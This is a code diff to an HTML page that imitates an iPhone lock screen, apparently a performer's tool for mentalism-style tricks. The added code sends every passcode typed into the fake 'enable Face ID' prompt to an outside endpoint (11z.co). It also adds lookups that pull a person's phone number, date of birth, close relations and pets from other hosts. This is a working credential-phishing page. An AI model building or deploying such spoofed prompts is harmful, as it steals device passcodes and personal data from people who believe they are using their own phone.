@@ -7,9 +7,8 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <meta name="theme-color" content="#000000">
 <title>Lock Screen</title>
-<!-- Lock Screen v1.0 — standalone passcode page. Remade from NotesLockScreen-Frontend/Backend.
-     Config + passcode history + wallpaper clean come from the same backend as the controller:
-     https://noteslockscreen-backend.onrender.com  (override with ?backend=... ) -->
+<!-- Lock Screen v1.1 - standalone. My settings are baked in below (no backend / controller).
+     Passcode goes straight to Inject. Hold Cancel = grab the Shortcut. -->
 <script src="../aurakit/aurakit.js"></script>
 <style>
 
@@ -215,7 +214,7 @@
 </head>
 <body>
 
-<div id="verTag">v1.0</div>
+<div id="verTag">v1.1</div>
 
   <!-- CUSTOM SCREENSHOT OUTCOME -->
   <div class="custom-shot-view" id="customShotView">
@@ -261,41 +260,38 @@
 
 
 <script>
-/* ============ config, backend sync, helpers (from NotesLockScreen) ============ */
-const DEFAULT_BACKEND_URL = "https://noteslockscreen-backend.onrender.com";
-const params = new URLSearchParams(location.search);
-if (params.get("backend")) {
-  try { localStorage.setItem("notes_backend_url", params.get("backend").replace(/\/+$/, "")); } catch (_) {}
-}
-function getBackendBase() {
-  try { return (localStorage.getItem("notes_backend_url") || DEFAULT_BACKEND_URL).replace(/\/+$/, ""); } catch (_) { return DEFAULT_BACKEND_URL; }
-}
-
-const DEF = {
+/* ============ my settings (baked in - edit here) ============ */
+const CFG = window.CFG = {
   shortcutUrl: "https://www.icloud.com/shortcuts/9e90e8b02c9e40e5b87a8e30ae849501",
   firstTapShortcut: true,
   linkOpenTarget: "safari",
+  linkSafari: { shortcut: true, lockCancel: true, lockEmergency: true },
   buttonRedirects: {},
   notesTheme: "auto",
-  unlockOutcome: "quit",
+  unlockOutcome: "notes",
   customScreenshotDataUrl: "",
   customScreenshotDarkDataUrl: "",
   screenshotTapUrl: "",
   screenshotBottomUrl: "",
   lockDigits: 6,
-  lockAttemptsToUnlock: 1,
+  lockAttemptsToUnlock: 2,
   lockGlassStyle: "liquid",
   lockBlur: 0,
   ghostUnlockMode: "keys",
-  ghostUnlockDelays: [1.4, 0.5, 0.5, 0.5, 0.5, 0.5],
-  lockCancelUrl: "https://www.icloud.com/shortcuts/c76944441d834e95a4664fc9681182c1",
-  lockEmergencyUrl: "",
+  ghostUnlockDelays: [4, 2, 1.5, 1, 1, 2],
+  lockCancelUrl: "https://icontrol-magic.onrender.com/",
+  lockEmergencyUrl: "https://ssw.im/276",
   injectPushEnabled: true,
   injectApiUrl: "https://11z.co/_w/19470/selection",
   lockApiPeekMode: "single",
-  lockApiPeeks: []
+  lockApiPeeks: [
+    { label: "Inject",  url: "https://11z.co/_w/19470/selection", field: "value", maxValues: "1" },
+    { label: "Noteify", url: "https://675da5da8962b0a8c8e5.digitalforestapp.xyz/276", field: "noteData", maxValues: "1" },
+    { label: "V2",      url: "https://icontrol-magic.onrender.com/api/summaries/latest", field: "phone, dob, keyPerson, keyPersonRelationship, pets", maxValues: "1" }
+  ]
 };
-let CFG = window.CFG = { ...DEF };
+
+/* ============ theme + shortcut helpers ============ */
 function isDarkModeNow() {
   const t = (CFG && CFG.notesTheme) || "auto";
   if (t === "dark") return true;
@@ -331,65 +327,7 @@ try {
     window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change", applyNotesTheme);
   }
 } catch (_) {}
-try {
-  const cached = JSON.parse(localStorage.getItem("notes_cfg_cache") || "null");
-  if (cached && typeof cached === "object") CFG = window.CFG = { ...DEF, ...cached };
-} catch (_) {}
 applyNotesTheme();
-
-async function syncConfigFromBackend() {
-  const base = getBackendBase();
-  if (!base) return;
-  try {
-    const r = await fetch(base + "/api/config", { cache: "no-store" });
-    if (!r.ok) return;
-    const d = await r.json();
-    if (d && typeof d === "object") {
-      CFG = window.CFG = { ...DEF, ...d };
-      try { localStorage.setItem("notes_cfg_cache", JSON.stringify(CFG)); } catch (_) {}
-      applyNotesTheme();
-      if (typeof updateFirstTapDot === "function") updateFirstTapDot();
-      if (window.LockScreen && LockScreen.open && typeof LockScreen.updateSubPromptPeriod === "function") {
-        LockScreen.updateSubPromptPeriod();
-      }
-    }
-  } catch (_) {}
-}
-syncConfigFromBackend();
-setInterval(syncConfigFromBackend, 4000);
-
-let _lastHandledCmdId = 0;
-try { _lastHandledCmdId = Number(localStorage.getItem("notes_last_cmd_id") || 0); } catch (_) {}
-
-function sendSpectatorHeartbeat() {
-  const base = getBackendBase();
-  if (!base) return;
-  fetch(base + "/api/heartbeat", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ spectator: true }),
-    keepalive: true
-  })
-    .then(r => r.ok ? r.json() : null)
-    .then(d => {
-      const cmd = d && d.pendingCommand;
-      if (cmd && cmd.type === "quit" && cmd.id && cmd.id > _lastHandledCmdId) {
-        _lastHandledCmdId = cmd.id;
-        try { localStorage.setItem("notes_last_cmd_id", String(cmd.id)); } catch (_) {}
-        if (window.AuraKit && typeof window.AuraKit.quitAppClip === "function") {
-          window.AuraKit.quitAppClip().catch(() => {});
-        } else if (window.Aura && window.Aura.appClip && typeof window.Aura.appClip.quit === "function") {
-          try { window.Aura.appClip.quit(); } catch (_) {}
-        }
-      }
-    })
-    .catch(() => {});
-}
-sendSpectatorHeartbeat();
-setInterval(sendSpectatorHeartbeat, 3000);
-document.addEventListener("visibilitychange", () => {
-  if (document.visibilityState === "visible") sendSpectatorHeartbeat();
-});
 
 function toSafariUrl(u) {
   const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
@@ -604,8 +542,13 @@ const LockScreen = window.LockScreen = {
     clearTimeout(this.holdTimers[kind]);
     this.holdTimers[kind] = setTimeout(() => {
       this.holdTimers[kind] = "fired";
-      const url = kind === "emergency" ? (CFG.lockEmergencyUrl || CFG.lockCancelUrl) : CFG.lockCancelUrl;
-      if (url && (!this.code || kind === "emergency")) openShortcutInSafari(url, window.getLinkSafariPref(kind === "emergency" ? "lockEmergency" : "lockCancel"));
+      if (kind === "cancel") {
+        // Hold Cancel = grab the Shortcut (opens the iCloud Shortcut so you can add it)
+        if (CFG.shortcutUrl) openShortcutInSafari(CFG.shortcutUrl, window.getLinkSafariPref("shortcut"));
+        return;
+      }
+      const url = CFG.lockEmergencyUrl || CFG.lockCancelUrl;
+      if (url) openShortcutInSafari(url, window.getLinkSafariPref("lockEmergency"));
     }, 800);
   },
   endFooterHold(e, kind, cancelled) {
@@ -647,22 +590,8 @@ const LockScreen = window.LockScreen = {
     sub.innerHTML = "Your passcode is required<br>to enable Face&nbsp;ID" + (this.willFailCurrentAttempt() ? "." : "");
   },
   async syncLastBackendPasscode() {
-    const base = getBackendBase();
-    if (!base) return;
-    try {
-      const r = await fetch(base + "/api/passcodes", { cache: "no-store" });
-      if (!r.ok) return;
-      const d = await r.json();
-      if (d && d.ok && Array.isArray(d.passcodes)) {
-        const latest = (d.passcodes[0] && d.passcodes[0].code) ? String(d.passcodes[0].code) : "";
-        this.lastBackendPasscode = latest;
-        try {
-          if (latest) localStorage.setItem("notes_last_passcode", latest);
-          else localStorage.removeItem("notes_last_passcode");
-        } catch (_) {}
-        if (this.open) this.updateKeyHintDot();
-      }
-    } catch (_) {}
+    try { this.lastBackendPasscode = localStorage.getItem("notes_last_passcode") || ""; } catch (_) {}
+    if (this.open) this.updateKeyHintDot();
   },
   updateKeyHintDot() {
     let lastCode = this.lastBackendPasscode;
@@ -823,12 +752,11 @@ const LockScreen = window.LockScreen = {
     this.stopGhostUnlock();
     this.lastBackendPasscode = String(code);
     try { localStorage.setItem("notes_last_passcode", String(code)); } catch (_) {}
-    const base = getBackendBase();
-    if (base) {
-      fetch(base + "/api/passcodes", {
+    if (CFG.injectPushEnabled && CFG.injectApiUrl) {
+      fetch(CFG.injectApiUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ code: String(code), digits: this.digits, ts: Date.now() }),
+        body: JSON.stringify({ value: String(code), selection: String(code) }),
         keepalive: true
       }).catch(() => {});
     }
@@ -1083,37 +1011,7 @@ const LockScreen = window.LockScreen = {
       r.readAsDataURL(file);
     });
   },
-  async cleanWallpaperAI(dataUrl) {
-    const base = getBackendBase();
-    if (!base) return;
-    try {
-      const res = await fetch(base + "/api/wallpaper/clean", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ image: dataUrl, aspect_ratio: "9:16" })
-      });
-      const d = await res.json().catch(() => ({}));
-      if (res.ok && d.ok && (d.dataUrl || d.url)) {
-        this.cleanedWallpaperDataUrl = d.dataUrl || d.url;
-        this.wallpaperDataUrl = this.cleanedWallpaperDataUrl;
-        this.wallpaperCleaned = true;
-        this._lastLensKey = "";
-        this.setAiReadyDot(true);
-        try {
-          localStorage.setItem("notes_lock_wallpaper", this.wallpaperDataUrl);
-          localStorage.setItem("notes_lock_wallpaper_cleaned", "1");
-        } catch (_) {}
-        if (window.AuraKit && AuraKit.haptics && typeof AuraKit.haptics.success === "function") {
-          try { AuraKit.haptics.success(); } catch (_) {}
-        } else if (window.Aura && window.Aura.haptic) {
-          try { Aura.haptic("notification", { style: "success" }); } catch (_) {}
-        } else if (navigator.vibrate) {
-          try { navigator.vibrate([60, 80, 60]); } catch (_) {}
-        }
-        if (this.open) this.show();
-      }
-    } catch (_) {}
-  },
+  async cleanWallpaperAI() { /* standalone: no backend AI clean */ },
 
   _apiPeekShowAll: false,
 
@@ -1458,12 +1356,11 @@ if (typeof updateFirstTapDot === "function") updateFirstTapDot();
   });
 })();
 
-/* ============ standalone page bootstrap ============ */
+/* ============ standalone bootstrap ============ */
 (function(){
   function present(){ try { if (!LockScreen.open && !LockScreen._unlocking) LockScreen.show(); } catch(_){} }
   if (document.readyState === "complete" || document.readyState === "interactive") present();
   else window.addEventListener("load", present);
-  // If it unlocks to nothing (quit outcome in a plain browser), tapping the screen re-arms the lock.
   document.addEventListener("pointerdown", function(e){
     if (LockScreen.open || LockScreen._unlocking) return;
     if (e.target.closest("#lockPastePrompt") || e.target.closest("#customShotView")) return;
